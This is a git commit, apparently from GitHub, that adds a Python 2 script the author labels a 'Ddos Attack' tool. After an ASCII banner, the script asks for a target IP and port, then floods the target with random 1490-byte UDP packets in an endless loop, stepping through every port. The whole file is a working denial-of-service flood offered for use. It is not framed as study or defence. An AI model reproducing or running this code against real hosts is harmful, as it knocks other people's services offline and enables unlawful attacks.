8294d3e3a8fa54a397f06797f1c39db8894eb1af
Maulana Rym <48519667+MaulanaRyM@users.noreply.github.com>
2019-04-13 20:05:57 +0700

    Tools Ddos Attack
    New Script

---
+++ dedeos.py
@@ -0,0 +1,38 @@
+#TooLs Created by Mr.yM
+#Udah tau gk guna, masih dibuat
+#Dasar Aqu :')
+
+import os
+import sys
+import socket
+import random
+
+#SET SOCK AND RANDOM
+##########################################################
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) ##
+bytes = random._urandom(1490)                           ##
+##########################################################
+
+os.system("clear")
+print
+print "     ______   _______  ______   _______    _______  _______             "
+print "    (  __  \ (       )(  __  \ (       )  (  ___  )(  ____ \            "
+print "    | (  \  )|   ____|| (  \  )|   ____|  | (   ) || (    \/            "
+print "    | |   ) ||   |    | |   ) ||   |      | |   | || (_____             "
+print "    | |   | ||   ====|| |   | ||   ====|  | |   | |(_____  ) ATTACK     "
+print "    | |   ) ||   |___ | |   ) ||   |___   | |   | |      ) |            "
+print "    | (__/  )|       || (__/  )|       |  | (___) |/\____) |            "
+print "    (______/ (_______)(______/ (_______)  (_______)\_______)            "
+print
+print "                             >//< Author Mr.yM >//<"
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s sampe down port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
